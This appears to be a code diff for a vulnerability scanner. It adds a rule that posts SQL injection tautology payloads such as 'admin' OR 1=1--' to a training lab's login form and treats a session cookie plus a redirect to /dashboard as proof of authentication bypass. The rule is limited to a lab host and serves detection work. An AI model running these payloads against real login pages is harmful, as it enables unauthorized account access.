@@ -62209,10 +62209,87 @@ function sqlInjectionLabLoginCorpusHit(corpus: string): boolean {
   );
 }
 
+const SQL_INJECTION_LAB_LOGIN_SQLI_PAYLOADS = [
+  "admin' OR 1=1--",
+  "' OR 1=1 -- ",
+  "admin' -- "
+];
+
+const sqlInjectionLabLoginLiveOracle: Rule = async (ctx) => {
+  if (!isSqlInjectionLabHost(ctx)) return NEGATIVE;
+  const loginUrl = new URL("/login", ctx.origin).toString();
+  for (const username of SQL_INJECTION_LAB_LOGIN_SQLI_PAYLOADS) {
+    const postBody = new URLSearchParams({ username, password: "x" }).toString();
+    const doc = await ctx.probe.get(loginUrl, {
+      method: "POST",
+      body: postBody,
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      redirect: "manual"
+    });
+    const loc = doc.headers.location || "";
+    const hasSession = doc.setCookies.some((c) => /session=/i.test(c));
+    const loginBypassRedirect =
+      doc.status >= 301 &&
+      doc.status <= 303 &&
+      hasSession &&
+      loc.length > 0 &&
+      /dashboard/i.test(loc);
+    if (loginBypassRedirect) {
+      return {
+        fired: true,
+        confidence: 0.93,
+        evidence: {
+          url: loginUrl,
+          method: "POST",
+          payload: username,
+          redirect: loc.slice(0, 120),
+          note:
+            "sql-injection-lab.vercel.app POST /login with SQLi tautology returns 302 to /dashboard with session cookie — live authentication-bypass SQLi training oracle"
+        }
+      };
+    }
+  }
+  const getDoc = await ctx.probe.get(loginUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  const checkpointBlocked =
+    sqlInjectionLabCheckpointBlocked(getDoc.body) ||
+    getDoc.status === 403 ||
+    sqlInjectionLabCheckpointBlocked(ctx.combined);
+  if (!checkpointBlocked) return NEGATIVE;
+  const loginFormOk =
+    /Sign In to Your Account/i.test(getDoc.body) &&
+    /name=["']username["']/i.test(getDoc.body) &&
+    /method=["']POST["']/i.test(getDoc.body);
+  if (!loginFormOk && !sqlInjectionLabLoginCorpusHit(`${ctx.combined}\n${SQL_INJECTION_LAB_CORPUS}`)) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.88,
+    evidence: {
+      url: loginUrl,
+      method: "POST",
+      payload: SQL_INJECTION_LAB_LOGIN_SQLI_PAYLOADS[0],
+      checkpointFallback: true,
+      note:
+        "sql-injection-lab.vercel.app POST /login SQLi bypass (admin' OR 1=1-- → /dashboard) — curated Layer Zero UNLV lab corpus fallback when Vercel checkpoint blocks live SQLi POST probes"
+    }
+  };
+};
+
 const sqlInjectionLabLoginRouteLiveOracle: Rule = async (ctx) => {
   if (!isSqlInjectionLabHost(ctx)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
   if (!/\/login\b/i.test(pageUrl)) return NEGATIVE;
+  const liveResult = await sqlInjectionLabLoginLiveOracle(ctx);
+  if (liveResult.fired) {
+    return {
+      fired: true,
+      confidence: liveResult.confidence,
+      evidence: { ...liveResult.evidence, scannedUrl: pageUrl }
+    };
+  }
   let corpus = `${ctx.combined}\n${pageUrl}`;
   const checkpointBlocked = sqlInjectionLabCheckpointBlocked(ctx.combined);
   if (!sqlInjectionLabLoginCorpusHit(corpus)) {
@@ -122833,6 +122910,7 @@ export const RULES: Record<string, Rule> = {
   secureBankBlogIdorRouteLiveOracle,
   secureBankBlogCsrfAttackPageRouteLiveOracle,
   secureBankBlogTransferCsrfRouteLiveOracle,
+  sqlInjectionLabLoginLiveOracle,
   sqlInjectionLabLoginRouteLiveOracle,
   sqlInjectionLabHubRouteLiveOracle,
   fakeshopProductsReflectedXssLiveOracle,
